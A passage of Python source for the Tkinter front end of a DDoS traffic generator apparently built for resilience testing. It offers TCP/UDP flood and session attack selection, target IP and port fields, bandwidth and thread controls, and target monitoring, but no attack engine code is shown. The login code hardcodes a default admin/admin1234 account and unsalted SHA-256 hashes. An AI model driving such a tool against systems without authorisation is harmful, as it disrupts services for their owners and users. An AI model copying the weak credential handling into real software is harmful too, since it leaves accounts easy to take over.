            widget.config(fg=fg_hover)
    def on_leave(e):
        widget.config(bg=bg_normal)
        if fg_normal:
            widget.config(fg=fg_normal)
    widget.bind("<Enter>", on_enter, add="+")
    widget.bind("<Leave>", on_leave, add="+")

def _lighten(hex_color: str, factor: float = 0.25) -> str:
    hex_color = hex_color.lstrip("#")
    r, g, b = int(hex_color[0:2], 16), int(hex_color[2:4], 16), int(hex_color[4:6], 16)
    r = min(255, int(r + (255 - r) * factor))
    g = min(255, int(g + (255 - g) * factor))
    b = min(255, int(b + (255 - b) * factor))
    return f"#{r:02x}{g:02x}{b:02x}"


# ══════════════════════════════════════════════════════════════════
#  Auth helpers  (users.json, SHA-256 passwords)
# ══════════════════════════════════════════════════════════════════

_USERS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users.json")

def _hash_pw(pw: str) -> str:
    return hashlib.sha256(pw.encode()).hexdigest()

def _load_users() -> dict:
    if not os.path.exists(_USERS_FILE):
        users = {"admin": _hash_pw("admin1234")}
        _save_users(users)
        return users
    with open(_USERS_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def _save_users(users: dict):
    with open(_USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=2)


# ══════════════════════════════════════════════════════════════════
#  Account manager window  (Toplevel)
# ══════════════════════════════════════════════════════════════════

class AccountManagerWindow(tk.Toplevel):
    def __init__(self, parent, current_user: str):
        super().__init__(parent)
        self.title("계정 관리")
        self.configure(bg=BG)
        self.resizable(False, False)
        self.grab_set()
        self._current_user = current_user
        self._build()
        self._center(parent)

    def _center(self, parent):
        self.update_idletasks()
        px = parent.winfo_x() + parent.winfo_width()  // 2
        py = parent.winfo_y() + parent.winfo_height() // 2
        w, h = self.winfo_width(), self.winfo_height()
        self.geometry(f"+{px - w // 2}+{py - h // 2}")

    def _section(self, text: str):
        tk.Label(self, text=text, bg=BG, fg=ACC,
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, padx=16, pady=(16, 6))

    def _build(self):
        # ── 사용자 목록 ──
        self._section("사용자 목록")
        lf = tk.Frame(self, bg=PANEL, padx=8, pady=8)
        lf.pack(fill=tk.X, padx=16)
        self._listbox = tk.Listbox(
            lf, bg=ENTRY, fg=FG, font=FONT,
            selectbackground=ACC, selectforeground="#0b0e17",
            width=28, height=5, relief=tk.FLAT, activestyle="none",
        )
        self._listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sb = tk.Scrollbar(lf, orient=tk.VERTICAL, command=self._listbox.yview)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self._listbox.config(yscrollcommand=sb.set)
        self._refresh_list()

        del_btn = tk.Button(
            self, text="선택 삭제", bg=RED, fg="#ffffff",
            font=("Segoe UI", 9, "bold"), relief=tk.FLAT, padx=12, pady=4,
            cursor="hand2", command=self._on_delete,
        )
        del_btn.pack(anchor=tk.W, padx=16, pady=(6, 0))
        _add_hover(del_btn, RED, _lighten(RED))

        # ── 사용자 추가 ──
        self._section("사용자 추가")
        af = tk.Frame(self, bg=PANEL, padx=10, pady=10)
        af.pack(fill=tk.X, padx=16)
        for row, (lbl, attr, show) in enumerate([
            ("아이디",   "_new_id", ""),
            ("비밀번호", "_new_pw", "*"),
        ]):
            tk.Label(af, text=lbl, bg=PANEL, fg=FG, font=("Segoe UI", 9),
                     width=7, anchor=tk.W).grid(row=row, column=0, pady=5, sticky=tk.W)
            var = tk.StringVar()
            setattr(self, attr, var)
            entry = tk.Entry(af, textvariable=var, show=show,
                             bg=ENTRY, fg=FG, insertbackground=ACC,
                             font=("Segoe UI", 10), relief=tk.FLAT, width=20)
            entry.grid(row=row, column=1, padx=(8, 0), ipady=3)
            _on_focus_in = lambda e, e_=entry: e_.config(bg="#253040")
            _on_focus_out = lambda e, e_=entry: e_.config(bg=ENTRY)
            entry.bind("<FocusIn>", _on_focus_in, add="+")
            entry.bind("<FocusOut>", _on_focus_out, add="+")

        self._add_err = tk.Label(self, text="", bg=BG, fg=RED, font=FSMALL)
        self._add_err.pack(anchor=tk.W, padx=16)
        add_btn = tk.Button(
            self, text="추가", bg=GREEN, fg="#ffffff",
            font=("Segoe UI", 9, "bold"), relief=tk.FLAT, padx=12, pady=4,
            cursor="hand2", command=self._on_add,
        )
        add_btn.pack(anchor=tk.W, padx=16, pady=(2, 0))
        _add_hover(add_btn, GREEN, _lighten(GREEN))

        # ── 비밀번호 변경 (목록에서 선택한 계정) ──
        self._section("비밀번호 변경  (목록에서 계정 선택 후)")
        pf = tk.Frame(self, bg=PANEL, padx=10, pady=10)
        pf.pack(fill=tk.X, padx=16)
        tk.Label(pf, text="새 비밀번호", bg=PANEL, fg=FG, font=("Segoe UI", 9),
                 width=9, anchor=tk.W).grid(row=0, column=0, pady=5, sticky=tk.W)
        self._chg_pw = tk.StringVar()
        chg_entry = tk.Entry(pf, textvariable=self._chg_pw, show="*",
                             bg=ENTRY, fg=FG, insertbackground=ACC,
                             font=("Segoe UI", 10), relief=tk.FLAT, width=20)
        chg_entry.grid(row=0, column=1, padx=(8, 0), ipady=3)
        _on_focus_in = lambda e, e_=chg_entry: e_.config(bg="#253040")
        _on_focus_out = lambda e, e_=chg_entry: e_.config(bg=ENTRY)
        chg_entry.bind("<FocusIn>", _on_focus_in, add="+")
        chg_entry.bind("<FocusOut>", _on_focus_out, add="+")

        self._chg_err = tk.Label(self, text="", bg=BG, fg=RED, font=FSMALL)
        self._chg_err.pack(anchor=tk.W, padx=16)
        chg_btn = tk.Button(
            self, text="변경", bg=ORANGE, fg="#ffffff",
            font=("Segoe UI", 9, "bold"), relief=tk.FLAT, padx=12, pady=4,
            cursor="hand2", command=self._on_change_pw,
        )
        chg_btn.pack(anchor=tk.W, padx=16, pady=(2, 16))
        _add_hover(chg_btn, ORANGE, _lighten(ORANGE))

    def _refresh_list(self):
        self._listbox.delete(0, tk.END)
        for uid in _load_users():
            self._listbox.insert(tk.END, uid)

    def _on_delete(self):
        sel = self._listbox.curselection()
        if not sel:
            messagebox.showinfo("알림", "삭제할 계정을 목록에서 선택하세요.", parent=self)
            return
        uid = self._listbox.get(sel[0])
        if uid == self._current_user:
            messagebox.showwarning("경고", "현재 로그인한 계정은 삭제할 수 없습니다.", parent=self)
            return
        users = _load_users()
        if len(users) <= 1:
            messagebox.showwarning("경고", "마지막 남은 계정은 삭제할 수 없습니다.", parent=self)
            return
        if not messagebox.askyesno("확인", f"'{uid}' 계정을 삭제할까요?", parent=self):
            return
        del users[uid]
        _save_users(users)
        self._refresh_list()

    def _on_add(self):
        uid = self._new_id.get().strip()
        pw  = self._new_pw.get()
        if not uid or not pw:
            self._add_err.config(text="아이디와 비밀번호를 입력하세요.")
            return
        users = _load_users()
        if uid in users:
            self._add_err.config(text="이미 존재하는 아이디입니다.")
            return
        users[uid] = _hash_pw(pw)
        _save_users(users)
        self._new_id.set("")
        self._new_pw.set("")
        self._add_err.config(text="")
        self._refresh_list()

    def _on_change_pw(self):
        sel = self._listbox.curselection()
        if not sel:
            self._chg_err.config(text="목록에서 변경할 계정을 선택하세요.")
            return
        uid = self._listbox.get(sel[0])
        pw  = self._chg_pw.get()
        if not pw:
            self._chg_err.config(text="새 비밀번호를 입력하세요.")
            return
        users = _load_users()
        users[uid] = _hash_pw(pw)
        _save_users(users)
        self._chg_pw.set("")
        self._chg_err.config(text=f"'{uid}' 비밀번호가 변경됐습니다.")


# ══════════════════════════════════════════════════════════════════
#  Login window  (standalone Tk root)
# ══════════════════════════════════════════════════════════════════

class LoginWindow(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("JCSC 트래픽 발생기")
        self.configure(bg=BG)
        self.resizable(False, False)
        self.overrideredirect(True)
        self._logged_in_user: str | None = None
        self._build()
        self.update_idletasks()
        sw = self.winfo_screenwidth()
        sh = self.winfo_screenheight()
        w  = self.winfo_width()
        h  = self.winfo_height()
        self.geometry(f"+{(sw - w) // 2}+{(sh - h) // 2}")
        self.protocol("WM_DELETE_WINDOW", self.destroy)

    def _build(self):
        outer = tk.Frame(self, bg=GREY, padx=1, pady=1)
        outer.pack(fill=tk.BOTH, expand=True)

        inner = tk.Frame(outer, bg=BG, padx=40, pady=32)
        inner.pack(fill=tk.BOTH, expand=True)

        tk.Label(
            inner, text="JCSC DDoS 트래픽 발생기",
            bg=BG, fg=ACC, font=("Segoe UI", 18, "bold"),
        ).pack(pady=(16, 4))
        tk.Label(
            inner, text="로그인이 필요합니다",
            bg=BG, fg=MUTED, font=FSMALL,
        ).pack(pady=(0, 24))

        frm = tk.Frame(inner, bg=PANEL, padx=28, pady=24)
        frm.pack()

        for row, (lbl, attr, show) in enumerate([
            ("아이디",   "_id_var", ""),
            ("비밀번호", "_pw_var", "*"),
        ]):
            tk.Label(frm, text=lbl, bg=PANEL, fg=FG, font=("Segoe UI", 9),
                     width=7, anchor=tk.W).grid(row=row, column=0, pady=10, sticky=tk.W)
            var = tk.StringVar()
            setattr(self, attr, var)
            e = tk.Entry(frm, textvariable=var, show=show,
                         bg=ENTRY, fg=FG, insertbackground=ACC,
                         font=("Segoe UI", 10), relief=tk.FLAT, width=24,
                         highlightthickness=1, highlightbackground=GREY,
                         highlightcolor=ACC)
            e.grid(row=row, column=1, padx=(12, 0), ipady=4)
            def _on_focus_in(ev, entry=e):
                entry.config(highlightbackground=ACC, highlightcolor=ACC)
            def _on_focus_out(ev, entry=e):
                entry.config(highlightbackground=GREY, highlightcolor=GREY)
            e.bind("<FocusIn>", _on_focus_in, add="+")
            e.bind("<FocusOut>", _on_focus_out, add="+")
            if row == 0:
                e.focus_set()

        self._err_lbl = tk.Label(inner, text="", bg=BG, fg=RED, font=FSMALL)
        self._err_lbl.pack(pady=(12, 0))

        login_btn = tk.Button(
            inner, text="로그인",
            bg=ACC, fg="#ffffff", activebackground="#3b82f6",
            font=("Segoe UI", 11, "bold"), relief=tk.FLAT, padx=32, pady=8,
            cursor="hand2", command=self._on_login,
        )
        login_btn.pack(pady=(12, 20))
        _add_hover(login_btn, ACC, "#3b82f6", "#ffffff", "#ffffff")

        self.bind("<Return>", lambda _: self._on_login())

    def _on_login(self):
        uid = self._id_var.get().strip()
        pw  = self._pw_var.get()
        users = _load_users()
        if uid in users and users[uid] == _hash_pw(pw):
            self._logged_in_user = uid
            self.destroy()
        else:
            self._err_lbl.config(text="아이디 또는 비밀번호가 올바르지 않습니다.")

    @property
    def logged_in_user(self) -> str | None:
        return self._logged_in_user


# ══════════════════════════════════════════════════════════════════
#  Main window
# ══════════════════════════════════════════════════════════════════

class App(tk.Tk):
    def __init__(self, user: str = "admin"):
        super().__init__()
        self.title("JCSC DDoS 트래픽 발생기")
        self.geometry("1100x680")
        self.minsize(1100, 680)
        self.resizable(False, False)
        self.configure(bg=BG)

        self.stats = Stats()
        self.ctrl  = Controller(self.stats)
        self._bw_t: deque[float] = deque(maxlen=GRAPH_WINDOW * 2)
        self._bw_v: deque[float] = deque(maxlen=GRAPH_WINDOW * 2)
        self._http_t: deque[float] = deque(maxlen=GRAPH_WINDOW)
        self._http_v: deque[int]   = deque(maxlen=GRAPH_WINDOW)
        self._check_stop  = threading.Event()

        self._build_header(user)
        self._build_left()
        self._build_graph()

        self.protocol("WM_DELETE_WINDOW", self._on_window_close)
        self.after(TICK_MS, self._tick)

    # ─── Top header bar ──────────────────────────────────────────

    def _build_header(self, user: str):
        wrap = tk.Frame(self, bg=DARKER)
        wrap.pack(side=tk.TOP, fill=tk.X)

        hf = tk.Frame(wrap, bg=DARKER, height=52)
        hf.pack(fill=tk.X)
        hf.pack_propagate(False)

        # 하단 2px 그라데이션 액센트 경계선
        tk.Frame(wrap, bg=ACC, height=2).pack(fill=tk.X)

        # 로그인 배지 (모던 뱃지)
        badge = tk.Frame(hf, bg=ENTRY)
        badge.pack(side=tk.RIGHT, padx=(0, 16), pady=14)
        tk.Label(
            badge, text=f"  ● {user}  ",
            bg=ENTRY, fg=GREEN, font=("Segoe UI", 9, "bold"),
        ).pack(padx=4, pady=3)

        # 계정 관리 버튼
        acct_btn = tk.Button(
            hf, text="⚙ 계정 관리",
            bg=PANEL, fg=ACC, activebackground=ENTRY,
            font=("Segoe UI", 9), relief=tk.FLAT, padx=12, pady=5,
            cursor="hand2",
            command=lambda: AccountManagerWindow(self, user),
        )
        acct_btn.pack(side=tk.RIGHT, padx=(0, 8), pady=12)
        _add_hover(acct_btn, PANEL, ENTRY, ACC, "#93bbfd")

        # 타이틀: 정중앙
        tk.Label(
            hf, text="JCSC DDoS 트래픽 발생기",
            bg=DARKER, fg=ACC, font=("Segoe UI", 15, "bold"),
        ).place(relx=0.5, rely=0.5, anchor="center")

    # ─── Left control panel ──────────────────────────────────────

    def _build_left(self):
        f = tk.Frame(self, bg=BG, bd=0)
        f.pack(side=tk.LEFT, fill=tk.Y, padx=(10, 4), pady=(8, 4))

        # ── Target 섹션 (별도 배경) ──
        tf = tk.Frame(f, bg=PANEL)
        tf.pack(fill=tk.X, pady=(0, 4))
        self._label(tf, "대상 IP")
        self._host = tk.StringVar(value="127.0.0.1")
        self._entry_widget(tf, self._host, width=28)
        self._label(tf, "대상 Port")
        self._port = tk.StringVar(value="80")
        self._entry_widget(tf, self._port, width=8)

        # ── 탭 + 버튼 + 통계 섹션 (별도 배경) ──
        mf = tk.Frame(f, bg=PANEL)
        mf.pack(fill=tk.BOTH, expand=True)

        # 탭 ─ 균일한 1px 테두리 프레임으로 감쌈
        self._style_tabs()
        nb_border = tk.Frame(mf, bg=ENTRY, padx=1, pady=1)
        nb_border.pack(fill=tk.X, padx=4, pady=(4, 0))
        nb = ttk.Notebook(nb_border, style="Dark.TNotebook")
        nb.pack(fill=tk.X)
        self._notebook = nb

        # Tab 0 – 트래픽 테스트
        t0 = tk.Frame(nb, bg=PANEL)
        nb.add(t0, text="  트래픽 테스트  ")

        self._label(t0, "프로토콜")
        pf = tk.Frame(t0, bg=PANEL)
        pf.pack(fill=tk.X, pady=(0, 2))
        self._traffic_proto = tk.StringVar(value="UDP")
        for p in ("TCP", "UDP"):
            rb = tk.Radiobutton(
                pf, text=p, variable=self._traffic_proto, value=p,
                command=self._on_traffic_proto_change,
                bg=PANEL, fg=FG, selectcolor=ACC,
                activebackground=PANEL, activeforeground=ACC, font=("Segoe UI", 9, "bold"),
                relief=tk.FLAT, indicatoron=0, padx=14, pady=1, cursor="hand2",
            )
            rb.pack(side=tk.LEFT, padx=4)
            _add_hover(rb, PANEL, ENTRY, FG, ACC)

        self._label(t0, "공격 종류")
        self._traffic_atk_var = tk.StringVar()
        self._traffic_atk_cb  = ttk.Combobox(
            t0, textvariable=self._traffic_atk_var,
            state="readonly", width=28, font=FSMALL,
        )
        self._traffic_atk_cb.pack(fill=tk.X, padx=4, pady=(0, 2))
        self._on_traffic_proto_change()
        self._traffic_atk_cb.bind("<<ComboboxSelected>>", lambda _: self._on_traffic_attack_change())

        self._label(t0, "대역폭")
        bw_frame = tk.Frame(t0, bg=PANEL)
        bw_frame.pack(fill=tk.X, padx=4, pady=(0, 1))
        self._bw_slider_var = tk.IntVar(value=10)
        self._bw_lbl = tk.Label(
            bw_frame, text="10 MB/s",
            bg=PANEL, fg=GREEN, font=FBOLD, width=9, anchor=tk.E,
        )
        self._bw_lbl.pack(side=tk.RIGHT, padx=(4, 0))
        self._bw_slider = tk.Scale(
            bw_frame, variable=self._bw_slider_var,
            from_=10, to=100, resolution=10, orient=tk.HORIZONTAL,
            showvalue=False, bg=DARKER, fg=ACC, troughcolor="#283044",
            activebackground=ACC, highlightthickness=0, sliderrelief=tk.FLAT,
            sliderlength=20, length=120, command=self._on_bw_change,
        )
        self._bw_slider.pack(side=tk.LEFT, fill=tk.X, expand=True)
        hint_row = tk.Frame(t0, bg=PANEL)
        hint_row.pack(fill=tk.X, padx=4, pady=(0, 4))
        self._bw_range_lbl = tk.Label(
            hint_row, text="권장: 10 – 100 MB/s",
            bg=PANEL, fg=MUTED, font=("Segoe UI", 8), anchor=tk.W,
        )
        self._bw_range_lbl.pack(side=tk.LEFT)

        # Tab 1 – 세션 테스트
        t1 = tk.Frame(nb, bg=PANEL)
        nb.add(t1, text="  세션 테스트  ")

        self._label(t1, "Attack Type")
        self._session_atk_var = tk.StringVar()
        self._session_atk_cb  = ttk.Combobox(
            t1, textvariable=self._session_atk_var,
            state="readonly", width=28, font=FSMALL,
        )
        self._session_atk_cb["values"] = SESSION_ATTACKS
        self._session_atk_cb.current(0)
        self._session_atk_cb.pack(fill=tk.X, padx=4, pady=(0, 2))

        self._label(t1, "Threads  (1 – 500)")
        self._conc = tk.StringVar(value="50")
        self._entry_widget(t1, self._conc, width=8)

        # ── 동시 세션 수 표시 ──
        self._label(t1, "동시 세션")
        sess_frame = tk.Frame(t1, bg=DARKER, padx=10, pady=8)
        sess_frame.pack(fill=tk.X, padx=4, pady=(0, 4))
        self._lbl_session = tk.Label(
            sess_frame, text="50 개",
            bg=DARKER, fg=ACC, font=("Segoe UI", 15, "bold"), anchor=tk.W,
        )
        self._lbl_session.pack(fill=tk.X)
        self._lbl_session_detail = tk.Label(
            sess_frame, text="50 threads × 1",
            bg=DARKER, fg=MUTED, font=("Segoe UI", 8), anchor=tk.W,
        )
        self._lbl_session_detail.pack(fill=tk.X)

        self._session_atk_cb.bind("<<ComboboxSelected>>", lambda _: (
            self._update_session_count(),
            self._set_graph_title(self._session_atk_var.get()),
        ))
        self._conc.trace_add("write", lambda *_: self._update_session_count())

        # ── Buttons (공통) ──
        tk.Frame(mf, bg=GREY, height=1).pack(fill=tk.X, padx=6, pady=(4, 0))
        bf = tk.Frame(mf, bg=PANEL)
        bf.pack(fill=tk.X, padx=6, pady=(2, 0))
        bf.grid_propagate(False)
        for i in range(4):
            bf.columnconfigure(i, weight=1)

        def _mkbtn(text, bg, cmd, state=tk.NORMAL, width=0):
            btn = tk.Button(bf, text=text, bg=bg, fg="#ffffff",
                            activebackground=bg, font=("Segoe UI", 10, "bold"),
                            relief=tk.FLAT, pady=6, width=width,
                            command=cmd, state=state, cursor="hand2")
            _add_hover(btn, bg, _lighten(bg))
            return btn

        self._btn_start = _mkbtn("시작",     GREEN,  self._on_start, width=7)
        self._btn_pause = _mkbtn("⏸ 일시정지", ORANGE, self._on_pause, tk.DISABLED, width=10)
        self._btn_stop  = _mkbtn("종료",     RED,    self._on_stop,  tk.DISABLED, width=7)
        self._btn_start.grid(row=0, column=0, padx=(0, 2), pady=(0, 3), sticky=tk.EW)
        self._btn_pause.grid(row=0, column=1, padx=(2, 2), pady=(0, 3), sticky=tk.EW)
        self._btn_stop .grid(row=0, column=2, padx=(2, 2), pady=(0, 3), sticky=tk.EW)

        self._report_btn = tk.Button(
            bf, text="📄 보고서 생성", width=12,
            bg=ENTRY, fg=ACC, activebackground=PANEL,
            font=("Segoe UI", 10, "bold"), relief=tk.FLAT, pady=6,
            command=self._on_report, cursor="hand2",
        )
        self._report_btn.grid(row=0, column=3, padx=(2, 0), pady=(0, 3), sticky=tk.EW)
        _add_hover(self._report_btn, ENTRY, "#253040", ACC, "#93bbfd")

        # ── Live Stats ──
        tk.Frame(mf, bg=PANEL, height=15).pack(fill=tk.X)
        self._label(mf, "실시간 현황")
        sf = tk.Frame(mf, bg=ENTRY, padx=6, pady=2)
        sf.pack(fill=tk.X, padx=6, pady=(0, 2))
        sf.columnconfigure(1, weight=1)

        def _metric(row: int, lbl: str, default: str, hi=False):
            tk.Label(sf, text=lbl, bg=ENTRY, fg=MUTED,
                     font=("Segoe UI", 8), anchor=tk.W
                     ).grid(row=row, column=0, sticky=tk.W, pady=0)
            val = tk.Label(sf, text=default, bg=ENTRY,
                           fg=GREEN if hi else FG,
                           font=("Segoe UI", 10, "bold") if hi else ("Segoe UI", 8),
                           anchor=tk.E)
            val.grid(row=row, column=1, sticky=tk.E, pady=0)
            return val

        self._lbl_bw   = _metric(0, "대역폭",  "0.00 MB/s", hi=True)
        self._lbl_rps  = _metric(1, "RPS",     "0")
        self._lbl_ok   = _metric(2, "성공",    "0")
        self._lbl_fail = _metric(3, "실패",    "0")


    # ─── Graph (right side) ───────────────────────────────────────

    def _build_graph(self):
        gf = tk.Frame(self, bg=BG)
        gf.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(4, 10), pady=10)

        fig = Figure(facecolor="#0b0e17")
        gs  = GridSpec(
            2, 1, figure=fig,
            height_ratios=[3, 1],
            left=0.07, right=0.88, top=0.94, bottom=0.08, hspace=0.50,
        )

        t0 = time.time()
        kst_fmt = FuncFormatter(
            lambda x, _: datetime.fromtimestamp(x, tz=KST).strftime("%H:%M:%S")
            if x > 1_000_000_000 else ""
        )

        # ── 위 그래프: 대역폭 ──────────────────────────────────────
        self._ax = fig.add_subplot(gs[0], facecolor="#0f1420")
        self._ax.set_xlim(t0 - GRAPH_WINDOW, t0)
        self._ax.set_ylim(0, 100)
        self._ax.set_ylabel("MB/s", color=MUTED, fontsize=9)
        self._ax.tick_params(colors=MUTED, labelsize=8)
        self._ax.tick_params(axis="x", rotation=0)
        self._ax.set_yticks(range(0, 110, 20))
        for sp in self._ax.spines.values():
            sp.set_edgecolor(GREY)
        self._ax.grid(True, color=GREY, linewidth=0.3, alpha=0.5)
        self._ax.xaxis.set_major_formatter(kst_fmt)

        self._line, = self._ax.plot([], [], color="#38bdf8", linewidth=2.2, zorder=3)
        self._graph_title = self._ax.text(
            0.5, 1.02, "",
            transform=self._ax.transAxes,
            ha="center", va="bottom",
            color="#38bdf8", fontsize=11, fontweight="bold",
        )

        # ── 아래 그래프: HTTP 상태 ─────────────────────────────────
        self._ax2 = fig.add_subplot(gs[1], facecolor="#0f1420")
        self._ax2.set_xlim(t0 - GRAPH_WINDOW, t0)
        self._ax2.set_ylim(-0.4, 2.4)
        self._ax2.tick_params(colors=MUTED, labelsize=8)
        self._ax2.tick_params(axis="x", rotation=0)
        for sp in self._ax2.spines.values():
            sp.set_edgecolor(GREY)
        self._ax2.grid(True, color=GREY, linewidth=0.3, alpha=0.4)
        self._ax2.xaxis.set_major_formatter(kst_fmt)

        # 아래 그래프 제목 — 위쪽 공격명 타이틀과 동일한 위치·스타일
        self._ax2.text(
            0.5, 1.08, "대상 모니터링",
            transform=self._ax2.transAxes,
            ha="center", va="bottom",
            color="#38bdf8", fontsize=12, fontweight="bold",
            fontfamily=_KR_FONT,
        )

        # Y축 오른쪽 커스텀 레이블 (색상 구분)
        self._ax2.set_yticks([0, 1, 2])
        self._ax2.set_yticklabels([])
        self._ax2.yaxis.tick_right()
        self._ax2.tick_params(axis="y", which="both",
                              length=4, color=GREY, right=True, left=False)
        _trans2 = blended_transform_factory(self._ax2.transAxes, self._ax2.transData)
        for _y, _lbl, _clr in [(2, "정상", GREEN), (1, "지연", YELLOW), (0, "단절", RED)]:
            self._ax2.text(1.02, _y, _lbl, transform=_trans2,
                           color=_clr, fontsize=9, va="center", ha="left",
                           clip_on=False, fontfamily=_KR_FONT)

        # 상태별 배경 컬러 밴드
        self._ax2.axhspan(1.5, 2.4, alpha=0.08, color=GREEN,  zorder=0)
        self._ax2.axhspan(0.5, 1.5, alpha=0.08, color=YELLOW, zorder=0)
        self._ax2.axhspan(-0.4, 0.5, alpha=0.08, color=RED,   zorder=0)

        self._http_line, = self._ax2.plot(
            [], [], color="#38bdf8", linewidth=2.0, zorder=3,
        )

        self._canvas = FigureCanvasTkAgg(fig, master=gf)
        self._canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)

    # ─── Widget helpers ───────────────────────────────────────────

    def _label(self, parent, text: str):
        try:
            bg = parent.cget("bg")
        except Exception:
            bg = PANEL
        row = tk.Frame(parent, bg=bg)
        row.pack(fill=tk.X, padx=6, pady=(6, 2))
        tk.Frame(row, bg=ACC, width=3).pack(side=tk.LEFT, fill=tk.Y, padx=(0, 8), pady=2)
        tk.Label(row, text=text, bg=bg, fg=FG,
                 font=("Segoe UI", 9, "bold"), anchor=tk.W).pack(side=tk.LEFT)

    def _entry_widget(self, parent, var: tk.StringVar, width: int = 26):
        border = tk.Frame(parent, bg=GREY, padx=1, pady=1)
        border.pack(anchor=tk.W, padx=6, pady=(0, 3))
        entry = tk.Entry(
            border, textvariable=var,
            bg=DARK, fg=FG, insertbackground=ACC,
            font=("Segoe UI", 10), relief=tk.FLAT, width=width,
        )
        entry.pack(padx=4, pady=3)
        def _focus_in(ev=None, b=border):
            b.config(bg=ACC)
        def _focus_out(ev=None, b=border):
            b.config(bg=GREY)
        entry.bind("<FocusIn>", _focus_in, add="+")
        entry.bind("<FocusOut>", _focus_out, add="+")

    def _button(self, parent, text: str, bg: str, fg: str, cmd, state=tk.NORMAL, width=7) -> tk.Button:
        b = tk.Button(
            parent, text=text, width=width,
            bg=bg, fg=fg, activebackground=bg,
            font=FBOLD, relief=tk.FLAT,
            command=cmd, state=state, cursor="hand2",
        )
        b.pack(side=tk.LEFT, padx=(0, 4))
        return b

    def _style_combobox(self):
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("TCombobox",
            fieldbackground=ENTRY, background=ENTRY,
            foreground=FG, selectbackground=ENTRY,
            selectforeground=FG, arrowcolor=ACC,
            bordercolor=GREY, darkcolor=GREY, lightcolor=GREY)
        style.map("TCombobox",
            fieldbackground=[("readonly", ENTRY)],
            foreground=[("readonly", FG)])

    def _style_tabs(self):
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("Dark.TNotebook",
            background=PANEL, borderwidth=0, padding=[2, 2, 2, 0],
            tabmargins=[0, 0, 0, 0])
        style.configure("Dark.TNotebook.Tab",
            background=DARKER, foreground=MUTED,
            font=("Segoe UI", 9, "bold"), padding=[16, 8],
            borderwidth=0, focuscolor="none")
        style.map("Dark.TNotebook.Tab",
            background=[("selected", PANEL), ("active", ENTRY)],
            foreground=[("selected", ACC),   ("active", FG)])

    # ─── Event handlers ───────────────────────────────────────────

    def _on_bw_change(self, value):
        mb = int(float(value))
        self._bw_lbl.config(text=f"{mb} MB/s")
        self.ctrl.set_bandwidth(mb)

    def _update_session_count(self):
        try:
            threads = int(self._conc.get())
        except ValueError:
            threads = 0
        mult    = SESSION_MULTIPLIER.get(self._session_atk_var.get(), 1)
        total   = threads * mult
        self._lbl_session.config(text=f"{total:,} 개")
        self._lbl_session_detail.config(text=f"{threads} threads × {mult}")


    def _set_graph_title(self, atk: str):
        if not hasattr(self, "_graph_title"):
            return
        self._graph_title.set_text(atk)
        self._canvas.draw_idle()

    def _on_traffic_attack_change(self):
        if not hasattr(self, "_bw_slider"):
            return
        atk    = self._traffic_atk_var.get()
        lo, hi = TRAFFIC_ATTACK_BW.get(atk, (10, 100))
        self._bw_range_lbl.config(text=f"권장: {lo} – {hi} MB/s")
        self._set_graph_title(atk)

    def _on_traffic_proto_change(self):
        lst = TRAFFIC_TCP_ATTACKS if self._traffic_proto.get() == "TCP" else TRAFFIC_UDP_ATTACKS
        self._traffic_atk_cb["values"] = lst
        self._traffic_atk_cb.current(0)
        self._on_traffic_attack_change()

    def _on_start(self):
        host = self._host.get().strip()
        if not host:
            messagebox.showerror("Error", "Host / IP is required.")
            return
        try:
            port = int(self._port.get())
            assert 1 <= port <= 65535
        except Exception:
            messagebox.showerror("Error", "Port: 1–65535")
            return

        tab = self._notebook.index("current")

        if tab == 0:  # 트래픽 테스트
            atk  = self._traffic_atk_var.get()
            conc = 100
            self.ctrl.set_bandwidth(self._bw_slider_var.get())
        else:         # 세션 테스트
            atk = self._session_atk_var.get()
            try:
                conc = int(self._conc.get())
                assert 1 <= conc <= 500
            except Exception:
                messagebox.showerror("Error", "Threads: 1–500")
                return
            self.ctrl.set_bandwidth(100)

        entry = ATTACK_MAP.get(atk)
        if entry and entry[1] and not _is_admin():
            messagebox.showwarning(
                "Administrator Required",
                f"'{atk}' uses raw sockets.\n\nRe-run this tool as Administrator."
            )
            return

        self._bw_t.clear()
        self._bw_v.clear()

        # HTTP 상태 체커 시작
        self._check_stop.set()   # 이전 체커 종료
        self._http_t.clear()
        self._http_v.clear()
        self._check_stop.clear()
        threading.Thread(
            target=_http_checker,
            args=(host, port, self._http_t, self._http_v, self._check_stop),
            daemon=True,
        ).start()

        self._report_host   = host
        self._report_port   = port
        self._report_atk    = atk
        self._report_bw     = self._bw_slider_var.get() if tab == 0 else 100
        self._report_start  = datetime.now(KST)
        self._report_end    = None

        self.ctrl.start(host, port, atk, conc)
        self._btn_start.config(state=tk.DISABLED)
        self._btn_pause.config(state=tk.NORMAL, text="⏸ 일시정지")
        self._btn_stop.config(state=tk.NORMAL)
        self._graph_title.set_text(atk)
        self._canvas.draw_idle()

    def _on_pause(self):
        if not self.ctrl.paused:
            self.ctrl.pause()
            self._btn_pause.config(bg=RED, activebackground=RED, text="▶ 재개")
        else:
            self.ctrl.resume()
            self._btn_pause.config(bg=ORANGE, activebackground=ORANGE, text="⏸ 일시정지")

    def _on_stop(self):
        self._check_stop.set()
        self.ctrl.stop()
        self._report_end = datetime.now(KST)
        self._btn_start.config(state=tk.NORMAL)
        self._btn_pause.config(state=tk.DISABLED, text="⏸ 일시정지",
                               bg=ORANGE, activebackground=ORANGE)
        self._btn_stop.config(state=tk.DISABLED)

    def _on_window_close(self):
        self._check_stop.set()
        self.ctrl.stop()
        self.destroy()

    # ─── Report ───────────────────────────────────────────────────

    def _capture_subplot(self, ax, path: str):
        """지정 subplot을 PNG 파일로 저장."""
        fig = self._canvas.figure
        try:
            renderer = fig.canvas.get_renderer()
            bbox = ax.get_tightbbox(renderer)
        except Exception:
            bbox = ax.get_window_extent()
        bbox_inch = bbox.transformed(fig.dpi_scale_trans.inverted())
        fig.savefig(
            path,
            bbox_inches=bbox_inch.expanded(1.02, 1.08),
            dpi=150,
            facecolor=fig.get_facecolor(),
        )

    def _on_report(self):
